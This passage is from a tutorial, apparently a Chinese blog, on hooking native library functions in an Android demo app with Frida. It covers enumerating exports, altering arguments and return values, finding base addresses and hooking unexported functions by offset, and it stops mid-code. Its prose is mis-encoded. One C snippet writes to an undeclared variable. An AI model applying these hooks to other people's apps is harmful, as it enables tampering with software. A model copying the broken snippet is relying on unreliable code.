class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line">    <span class="keyword">private</span> Button btnPrint;</span><br><span class="line">    <span class="keyword">private</span> Button btnAddThreeNum;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        btnPrint = findViewById(R.id.btn_print);</span><br><span class="line">        btnPrint.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        btnAddThreeNum = findViewById(R.id.btn_add);</span><br><span class="line">        btnAddThreeNum.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_print:</span><br><span class="line">                <span class="type">String</span> <span class="variable">print</span> <span class="operator">=</span> Calc.print();</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, print, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_add:</span><br><span class="line">                <span class="type">int</span> <span class="variable">add</span> <span class="operator">=</span> Calc.addThreeNum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, String.valueOf(add), Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.fridasodemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> String <span class="title function_">print</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">addThreeNum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR, <span class="string">&quot;Tag&quot;</span>, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_zyc_fridasodemo_Calc_print</span><span class="params">(JNIEnv *env, jclass clazz)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str = <span class="string">&quot;Hello c++&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_com_zyc_fridasodemo_Calc_addThreeNum</span><span class="params">(JNIEnv *env, jclass clazz, jint a, jint b, jint c)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01-éå†å¯¼å…¥-å¯¼å‡ºå‡½æ•°"><a href="#0x01-éå†å¯¼å…¥-å¯¼å‡ºå‡½æ•°" class="headerlink" title="0x01 éå†å¯¼å…¥&#x2F;å¯¼å‡ºå‡½æ•°"></a>0x01 éå†å¯¼å…¥&#x2F;å¯¼å‡ºå‡½æ•°</h1><p>é¦–å…ˆé€šè¿‡idaæŸ¥çœ‹soçš„å¯¼å…¥å‡½æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161632060.jpeg" alt="img"> </p><p>å¯¼å‡ºå‡½æ•°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161633417.jpeg" alt="img"> </p><p>hook soçš„å¯¼å…¥&#x2F;å¯¼å‡ºå‡½æ•°éœ€è¦åˆ†åˆ«ç”¨åˆ° <strong>Module.enumerateImports()</strong> å’Œ <strong>Module.enumerateExports()</strong> ä¸¤ä¸ªå‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookImEx</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ä»¥ä¸‹æ˜¯å¯¼å…¥å‡½æ•°ï¼š&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> importMethods = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; importMethods.<span class="property">length</span>; index++) &#123;</span><br><span class="line">        <span class="keyword">const</span> element = importMethods[index];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(element));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ä»¥ä¸‹æ˜¯å¯¼å‡ºå‡½æ•°ï¼š&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> exportMethods = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; exportMethods.<span class="property">length</span>; index++) &#123;</span><br><span class="line">        <span class="keyword">const</span> element = exportMethods[index];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(element));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾…soåŠ è½½å¥½åè¿è¡Œï¼Œå¯ä»¥ä»ä¸‹åˆ—å¯¹è±¡çš„nameã€addresså–åˆ°å‡½æ•°åå’Œåœ°å€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161634563.jpeg" alt="img"> </p><h1 id="0x02-é€šè¿‡å‡½æ•°åhookå¯¼å‡ºå‡½æ•°"><a href="#0x02-é€šè¿‡å‡½æ•°åhookå¯¼å‡ºå‡½æ•°" class="headerlink" title="0x02 é€šè¿‡å‡½æ•°åhookå¯¼å‡ºå‡½æ•°"></a>0x02 é€šè¿‡å‡½æ•°åhookå¯¼å‡ºå‡½æ•°</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookByName</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_zyc_fridasodemo_Calc_addThreeNum&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onEnter...&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[0]:&quot;</span>,args[<span class="number">0</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[1]:&quot;</span>,args[<span class="number">1</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2]ï¼š&quot;</span>,args[<span class="number">2</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[3]ï¼š&quot;</span>,args[<span class="number">3</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[4]ï¼š&quot;</span>,args[<span class="number">4</span>]);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123; </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onLeave...&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval:&quot;</span>,retval); <span class="comment">// å‡½æ•°è¿”å›å€¼</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾…soåŠ è½½å¥½åè¿è¡Œï¼Œå…¶ä¸­arg[0]ä¸º JNIEnv * åœ°å€ï¼Œarg[1]ä¸º jclassåœ°å€ï¼ˆå¦‚æœæ˜¯éé™æ€å‡½æ•°ï¼Œåˆ™æ˜¯jobjectï¼‰ã€‚åé¢ä¸ºä¸‰ä¸ªintï¼Œä½¿ç”¨ .toInt32 å¯ä»¥è½¬ä¸º10è¿›åˆ¶ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161637160.gif" alt="img"> </p><h1 id="0x03-Hookå‚æ•°"><a href="#0x03-Hookå‚æ•°" class="headerlink" title="0x03 Hookå‚æ•°"></a>0x03 Hookå‚æ•°</h1><p>æ ¹æ®ä¸Šé¢è·å–çš„ args æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å‚æ•°ï¼Œä½†æ³¨æ„å‚æ•°å¾—æ˜¯ <strong>NativePointer</strong>ï¼Œç›´æ¥ç”¨ â€œ&#x3D;â€ èµ‹å€¼ä¼šæŠ¥é”™â€œexpected a pointerâ€ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookParam</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_zyc_fridasodemo_Calc_addThreeNum&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                args[<span class="number">2</span>] = <span class="title function_">ptr</span>(<span class="number">1000</span>); <span class="comment">// å†™æˆ args[2]=1000 ä¼šæŠ¥é”™</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œç‚¹å‡»å¯ä»¥çœ‹åˆ°è¿”å›å€¼å·²ç»æ”¹å˜ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161638522.jpeg" alt="img"> </p><h1 id="0x04-Hookè¿”å›å€¼"><a href="#0x04-Hookè¿”å›å€¼" class="headerlink" title="0x04 Hookè¿”å›å€¼"></a>0x04 Hookè¿”å›å€¼</h1><p>ä¿®æ”¹è¿”å›å€¼æ—¶ï¼Œç”¨ â€œ&#x3D;â€ å¹¶ä¸ä¼šæŠ¥é”™ï¼Œä½†è¿™æ ·çš„ä¿®æ”¹ä¸ä¼šå½±å“ç¨‹åºå˜é‡ï¼Œå¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">    retval = <span class="number">888</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval:&quot;</span>,retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407170948996.gif" alt="img"> </p><p>æ­£ç¡®å†™æ³•éœ€è¦ä½¿ç”¨ <strong>replace()</strong> å‡½æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookReturn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_zyc_fridasodemo_Calc_addThreeNum&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;&#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">32</span>); <span class="comment">//ç”¨ replace() ä¸è¦ç”¨ =</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval:&quot;</span>,retval);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// å¦‚æœè¿”å›å€¼æ˜¯jstringï¼Œå¾—ç”¨ä¸‹é¢æ–¹å¼æ›¿æ¢</span></span><br><span class="line">               <span class="comment">//var env = Java.vm.getEnv(); //è·å–envå¯¹è±¡ï¼Œå³ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">               <span class="comment">//var jstrings = env.newStringUtf(&quot;xxxx&quot;); //è¿”å›çš„æ˜¯å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œä½¿ç”¨jniå‡½æ•°æ„é€ ä¸€ä¸ªnewStringUtfå¯¹è±¡ç”¨æ¥ä»£æ›¿è¿™ä¸ªæŒ‡é’ˆ</span></span><br><span class="line">               <span class="comment">//retval.replace(jstrings); </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407170951383.jpeg" alt="img"> </p><h1 id="0x05-hookå¼•ç”¨ä¼ é€’å‚æ•°å€¼"><a href="#0x05-hookå¼•ç”¨ä¼ é€’å‚æ•°å€¼" class="headerlink" title="0x05 hookå¼•ç”¨ä¼ é€’å‚æ•°å€¼"></a>0x05 hookå¼•ç”¨ä¼ é€’å‚æ•°å€¼</h1><p>å¼•ç”¨ä¼ é€’æ˜¯C++å¸¸è§å‡½æ•°å†™æ³•ï¼Œè¿™æ ·æ˜¯æ²¡æœ‰è¿”å›å€¼çš„ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//char* str = &quot;hello&quot;; //è¿™æ ·å†™ä¼šæŠ¥é”™ï¼ŒstræŒ‡å‘é™æ€å­˜å‚¨åŒºä¸å…è®¸ä¿®æ”¹</span></span><br><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="type">char</span>* str)</span>&#123;</span><br><span class="line">    cs[<span class="number">0</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    cs[<span class="number">1</span>] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    cs[<span class="number">2</span>] = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦Hook <strong>onEnter()</strong> å’Œ <strong>onLeave()</strong> æ—¶çš„æŒ‡é’ˆï¼ˆå‚æ•°ï¼‰ï¼Œå°±èƒ½çŸ¥é“å‡½æ•°çš„ä½œç”¨ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookPoint</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;_Z6changePc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\r\nå‡½æ•°åœ°å€ï¼š&quot;</span> + address);</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onEnter...&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¼•ç”¨å‚æ•°ï¼š&quot;</span> + args[<span class="number">0</span>].<span class="title function_">readCString</span>()); <span class="comment">//æ‰“å°cstring</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°å¤„å†…å­˜ï¼š\r\n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">0</span>]));</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">args0</span> = args[<span class="number">0</span>]; <span class="comment">//ä¿å­˜å‚æ•°ï¼Œç»™onLeave()ä¸­ä½¿ç”¨</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onLeave...&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¼•ç”¨å‚æ•°ï¼š&quot;</span> + <span class="variable language_">this</span>.<span class="property">args0</span>.<span class="title function_">readCString</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°å¤„å†…å­˜ï¼š\r\n&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407170954994.jpeg" alt="img"> </p><h1 id="0x06-è·å–soåŸºå€"><a href="#0x06-è·å–soåŸºå€" class="headerlink" title="0x06 è·å–soåŸºå€"></a>0x06 è·å–soåŸºå€</h1><p>ä½¿ç”¨ <strong>findBaseAddress()</strong> å¯ä»¥hookåˆ°soçš„åŸºå€ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookBaseAddress</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(address); <span class="comment">//è¿™é‡Œæˆ‘è·å–åˆ°çš„æ˜¯ 0xb8f91000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <strong>cat &#x2F;proc&#x2F;(è¿›ç¨‹pid)&#x2F;maps</strong> å‘½ä»¤å¯ä»¥éªŒè¯libnative-lib.soåŸºå€ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171002258.jpeg" alt="img"> </p><h1 id="0x07-hookæœªå¯¼å‡ºå‡½æ•°"><a href="#0x07-hookæœªå¯¼å‡ºå‡½æ•°" class="headerlink" title="0x07 hookæœªå¯¼å‡ºå‡½æ•°"></a>0x07 hookæœªå¯¼å‡ºå‡½æ•°</h1><p>å¦‚æœé‡åˆ°soä¸­åŠ¨æ€æ³¨å†Œå‡½æ•°çš„æƒ…å†µï¼Œåˆè¯¥å¦‚ä½•Hookï¼Ÿåœ¨æµ‹è¯•ç”¨ä¾‹ä¸­å¢åŠ ä¸€ä¸ªåŠ¨æ€æ³¨å†Œçš„printDynamic()ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// public native static String printDynamic(String a); //com.zyc.fridasodemo.Calcç±»å¢åŠ æ­¤æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// static + JNI_OnLoadåŠ¨æ€æ³¨å†Œï¼Œidaçœ‹ä¸åˆ°å¯¼å‡º</span></span><br><span class="line"><span class="keyword">static</span> jstring <span class="title function_">print_Dynamic</span><span class="params">(JNIEnv *env, jclass clazz, jstring a)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> JNINativeMethod methods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;printDynamic&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>,(<span class="keyword">void</span>*)print_Dynamic&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">registerNatives</span><span class="params">(JNIEnv *env)</span> &#123;</span><br><span class="line">    <span class="comment">//æ‰¾åˆ°å£°æ˜nativeæ–¹æ³•çš„ç±»</span></span><br><span class="line">    const <span class="type">char</span>* className  = <span class="string">&quot;com/zyc/fridasodemo/Calc&quot;</span>;</span><br><span class="line">    <span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;FindClass(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz == NULL)&#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ³¨å†Œå‡½æ•° å‚æ•°ï¼šjavaç±» æ‰€è¦æ³¨å†Œçš„å‡½æ•°æ•°ç»„ æ³¨å†Œå‡½æ•°çš„ä¸ªæ•°</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">methodsNum</span> <span class="operator">=</span> sizeof(methods)/ sizeof(methods[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span>(env-&gt;RegisterNatives(clazz,methods,methodsNum) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span>&#123;</span><br><span class="line">    JNIEnv* env = NULL;</span><br><span class="line">    <span class="comment">//è·å–JNIEnv</span></span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;GetEnv(reinterpret_cast&lt;<span class="keyword">void</span>**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(env != NULL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!registerNatives(env))&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿”å›jni çš„ç‰ˆæœ¬</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“releaseåŒ…åç”¨idaæ£€æŸ¥soçš„å¯¼å‡ºå‡½æ•°å‘ç°å¹¶æ²¡æœ‰get_two_num()ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171006265.jpeg" alt="img"> </p><p>é€šè¿‡ <strong>JNI_OnLoad()</strong> æ‰¾åˆ°å…¶åœ°å€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171006024.jpeg" alt="img"> </p><p>ç„¶åå°±å¯ä»¥ç”¨ <strong>åŸºå€+åç§»</strong> æ–¹å¼è¿›è¡ŒHookäº†ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookDynamic</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> soAddress = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;soåŸºå€ï¼š&quot;</span> + soAddress);</span><br><span class="line">    <span class="keyword">if</span> (soAddress) &#123;</span><br><span class="line">        <span class="keyword">const</span> methodAddress = soAddress.<span class="title function_">add</span>(<span class="number">0x0690</span>); <span class="comment">// thrumbæŒ‡ä»¤é›†è¦+1</span></span><br><span class="line">        <span class="keyword">if</span> (methodAddress) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‡½æ•°åœ°å€ï¼š&quot;</span> + methodAddress);</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(methodAddress, &#123;</span><br><span class="line">                <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hookåŠ¨æ€æ³¨å†Œå‡½æ•°çš„å‚æ•°ï¼š&quot;</span> + <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>], <span class="literal">null</span>).<span class="title function_">readCString</span>()); <span class="comment">//æ‰“å°jstringè¦ç”¨getStringUtfChars</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hookåŠ¨æ€æ³¨å†Œå‡½æ•°çš„è¿”å›å€¼ï¼š&quot;</span> + <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(retval, <span class="literal">null</span>).<span class="title function_">readCString</span>());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡ŒæˆåŠŸï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/gif/2167914/1709718183086-ecca6edf-a363-4ef8-a2d2-66c0a9c419b5.gif" alt="img">****</p><h1 id="0x08-Hook-soåŠ è½½ï¼ˆdlopenï¼‰"><a href="#0x08-Hook-soåŠ è½½ï¼ˆdlopenï¼‰" class="headerlink" title="0x08 Hook soåŠ è½½ï¼ˆdlopenï¼‰"></a>0x08 Hook soåŠ è½½ï¼ˆdlopenï¼‰</h1><p>å½“é‡åˆ°â€œç­‰soåŠ è½½å®Œåè¿›è¡ŒæŸHookæ“ä½œæ—¶â€ï¼Œå¯ä»¥Hook dlopenï¼ˆæœ‰çš„æ˜¯android_dlopen_extï¼‰æ–¹æ³•æ¥ç¡®å®šsoçš„åŠ è½½ã€‚PSï¼šä¸æ¨èHook System.loadLibrary()ï¼Œå› ä¸ºåŠ è½½soçš„æ–¹å¼å¹¶ä¸æ­¢è¿™ä¸€ç§ï¼Œè€Œä¸”æœ€ç»ˆéƒ½ä¼šè°ƒç”¨ **dlopen()**ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookDlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> dlopenAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dlopenAddr) 